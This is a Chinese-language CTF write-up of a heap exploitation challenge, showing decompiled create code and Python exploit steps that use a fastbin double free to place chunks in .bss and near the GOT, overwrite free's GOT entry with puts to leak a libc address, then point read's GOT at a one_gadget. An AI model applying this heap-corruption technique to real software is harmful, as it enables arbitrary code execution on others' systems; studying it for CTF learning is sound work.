**利用：fastbin attack**

利用fastbin double free，将堆分别分配到.bss段和got表。

程序中给出了三个功能：create，delete，edit。
create：
```
void sub_40090A()
{
  signed int i; // [rsp+8h] [rbp-8h]
  int v1; // [rsp+Ch] [rbp-4h]
  for ( i = 0; i <= 15; ++i )
  {
    if ( !node_info[2 * i] )
    {
      putchar(62);
      v1 = read_str2i();
      if ( v1 > 0 && v1 <= 127 )
      {
        node_info[2 * i + 1] = (void *)v1;
        node_info[2 * i] = malloc(v1 + 1);
        putchar(62);
        read(0, node_info[2 * i], v1);
      }
      return;
    }
  }
}
```
node_info 是一个全局变量，用来存放每个chunk的地址和用户请求的大小。可以用以下结构体表示：
```
struct node_info
{
   void *     chunk_ptr
   long long  size
}
```
可以先使用Arbitrary alloc，将堆分配到这里，修改chunk_ptr为函数的got地址，
由于程序中没有给出打印功能，可以再将堆分配到got，则可以将free的got项修改为puts_plt，然后再free chunk时，就可以将函数地址打印出来。

### 修改chunk_ptr

```
create(0x50,"aaa")  #index 0, 这个chunk是用来满足size位，用来当fake_chunk的size位。

create(0x40,"aa")   #index 1
create(0x40,"asaa") #index 2
delete(1) 
delete(2)
delete(1)  # double free，然后修改fd指针
create(0x40,p64(0x6010A0))
create(0x40,"a")          
create(0x40,"a")  
        
read_got=0x601048
payload=read_got
create(0x40,p64(payload)) #分配到目标chunk，然后修改chunk_ptr，这里是将chunk_ptr修改为read got。
```
### 修改free的got表项。

```
create(0x50,"aaaaaaaa") 
create(0x50,"bbbbbbbb")
delete(7)
delete(8)
delete(7)                      #接着double free
fake_chunk_addr=0x601002-0x8   #利用错位，绕过size的检查。
create(0x50,p64(fake_chunk_addr))#index 9
create(0x50,"aaa")#index 10
create(0x50,"aaa")#index 11
```
got表附近的内存数据如下：

```
pwndbg> x/50bx 0x601000-0x20                                                       
0x600fe0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x600fe8:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x600ff0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x600ff8:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x601000:       0x28    0x0e    **0x60    0x00    0x00    0x00    0x00    0x00
0x601008:       0x68    0xe1**    0xff    0xf7    0xff    0x7f    0x00    0x00
0x601010:       0xe0    0xee
```
fastbin的size检查只计算size位的低4字节。所以0x601002 可以满足要求：

```
pwndbg> x/gx 0x601002
0x601002:       0xe168000000000060
```
然后修改free的got为puts_plt
```
puts_plt=elf.plt["puts"]
#0x601002-0x8+0x10
payload='\x00'*14+p64(puts_plt)
create(0x50,payload)  #index 12
delete(1)
read_addr=u64(a.recvuntil("\n",drop=True).ljust(8,"\x00"))
success("read address ==> 0x%x"%read_addr)
```

计算出libc的基址，然后再修改read_got为one_gadget即可

